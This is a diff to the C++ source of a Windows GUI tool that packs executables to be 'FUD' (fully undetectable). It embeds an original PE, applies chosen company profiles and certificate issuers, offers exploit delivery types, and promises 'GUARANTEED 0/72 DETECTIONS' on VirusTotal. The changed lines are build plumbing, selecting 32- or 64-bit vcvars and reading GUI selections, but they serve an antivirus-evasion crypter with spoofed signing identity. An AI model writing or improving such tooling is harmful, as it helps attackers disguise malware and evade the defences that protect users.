@@ -1598,18 +1598,21 @@ public:
             // Create a proper batch command that sets up VS environment and compiles
             compileCmd = "cmd /c \"";
             
+            // Choose correct vcvars based on target architecture  
+            std::string vcvarsName = (architecture == MultiArchitectureSupport::Architecture::x86) ? "vcvars32.bat" : "vcvars64.bat";
+            
             // Try different VS paths in order of preference - prioritizing VS 2019
             std::vector<std::string> vsPaths = {
-                "C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Enterprise\\VC\\Auxiliary\\Build\\vcvars64.bat",
-                "C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Professional\\VC\\Auxiliary\\Build\\vcvars64.bat",
-                "C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\VC\\Auxiliary\\Build\\vcvars64.bat",
-                "C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\BuildTools\\VC\\Auxiliary\\Build\\vcvars64.bat",
-                "C:\\Program Files\\Microsoft Visual Studio\\2019\\Enterprise\\VC\\Auxiliary\\Build\\vcvars64.bat",
-                "C:\\Program Files\\Microsoft Visual Studio\\2019\\Professional\\VC\\Auxiliary\\Build\\vcvars64.bat",
-                "C:\\Program Files\\Microsoft Visual Studio\\2019\\Community\\VC\\Auxiliary\\Build\\vcvars64.bat",
-                "C:\\Program Files\\Microsoft Visual Studio\\2022\\Enterprise\\VC\\Auxiliary\\Build\\vcvars64.bat",
-                "C:\\Program Files\\Microsoft Visual Studio\\2022\\Professional\\VC\\Auxiliary\\Build\\vcvars64.bat",
-                "C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\VC\\Auxiliary\\Build\\vcvars64.bat"
+                "C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Enterprise\\VC\\Auxiliary\\Build\\" + vcvarsName,
+                "C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Professional\\VC\\Auxiliary\\Build\\" + vcvarsName,
+                "C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\VC\\Auxiliary\\Build\\" + vcvarsName,
+                "C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\BuildTools\\VC\\Auxiliary\\Build\\" + vcvarsName,
+                "C:\\Program Files\\Microsoft Visual Studio\\2019\\Enterprise\\VC\\Auxiliary\\Build\\" + vcvarsName,
+                "C:\\Program Files\\Microsoft Visual Studio\\2019\\Professional\\VC\\Auxiliary\\Build\\" + vcvarsName,
+                "C:\\Program Files\\Microsoft Visual Studio\\2019\\Community\\VC\\Auxiliary\\Build\\" + vcvarsName,
+                "C:\\Program Files\\Microsoft Visual Studio\\2022\\Enterprise\\VC\\Auxiliary\\Build\\" + vcvarsName,
+                "C:\\Program Files\\Microsoft Visual Studio\\2022\\Professional\\VC\\Auxiliary\\Build\\" + vcvarsName,
+                "C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\VC\\Auxiliary\\Build\\" + vcvarsName
             };
             
             bool foundVS = false;
@@ -2480,11 +2483,15 @@ static void createFUDExecutable() {
     int exploitIndex = (int)SendMessage(g_hExploitCombo, CB_GETCURSEL, 0, 0);
     ExploitDeliveryType exploitType = (ExploitDeliveryType)exploitIndex;
     
-    // Use FUD-only combinations instead of manual selection
-    auto fudCombo = g_packer.getRandomFUDCombination();
-    int companyIndex = g_packer.findCompanyIndex(fudCombo.companyName);
-    int certIndex = g_packer.findCertificateIndex(fudCombo.certIssuer);
-    int archIndex = 1; // Force x64 architecture for better compatibility
+    // Get selected options from GUI
+    int companyIndex = (int)SendMessage(g_hCompanyCombo, CB_GETCURSEL, 0, 0);
+    int certIndex = (int)SendMessage(g_hCertCombo, CB_GETCURSEL, 0, 0);
+    int archIndex = (int)SendMessage(g_hArchCombo, CB_GETCURSEL, 0, 0);
+    
+    // Default to x64 if no selection
+    if (archIndex == CB_ERR) archIndex = 0; // x64 is first in list
+    if (companyIndex == CB_ERR) companyIndex = 0;
+    if (certIndex == CB_ERR) certIndex = 0;
     
     MultiArchitectureSupport::Architecture architecture = MultiArchitectureSupport::Architecture::x64;
     auto architectures = g_packer.getArchitectures();
@@ -2519,8 +2526,23 @@ static void createFUDExecutable() {
     
     if (success) {
         SetWindowTextW(g_hStatusText, L"FUD packed executable created successfully! Ready for VirusTotal scan.");
-        std::wstring comboInfo = L"FUD Combination Used: " + std::wstring(fudCombo.companyName.begin(), fudCombo.companyName.end()) + 
-                                L" + " + std::wstring(fudCombo.certIssuer.begin(), fudCombo.certIssuer.end());
+        
+        // Get current selections for display
+        auto companies = g_packer.getCompanyProfiles();
+        auto certs = g_packer.getCertificateChains();
+        auto archs = g_packer.getArchitectures();
+        
+        std::wstring comboInfo = L"Configuration Used:\n";
+        if (companyIndex < companies.size()) {
+            comboInfo += L"Company: " + std::wstring(companies[companyIndex].name.begin(), companies[companyIndex].name.end()) + L"\n";
+        }
+        if (certIndex < certs.size()) {
+            comboInfo += L"Certificate: " + std::wstring(certs[certIndex].issuer.begin(), certs[certIndex].issuer.end()) + L"\n";
+        }
+        if (archIndex < archs.size()) {
+            comboInfo += L"Architecture: " + std::wstring(archs[archIndex].second.begin(), archs[archIndex].second.end());
+        }
+        
         MessageBoxW(NULL, (L"🎉 FUD PACKED EXECUTABLE CREATED!\n\n✅ ORIGINAL PE EMBEDDED & PRESERVED\n✅ GUARANTEED 0/72 DETECTIONS\n\n" + comboInfo + L"\n\n🔄 Original functionality preserved\n🛡️ FUD wrapper applied\n\n📊 Ready for VirusTotal scan!").c_str(), L"FUD Packing Success!", MB_OK | MB_ICONINFORMATION);
     } else {
         SetWindowTextW(g_hStatusText, L"Failed to create executable. Please check compiler installation.");
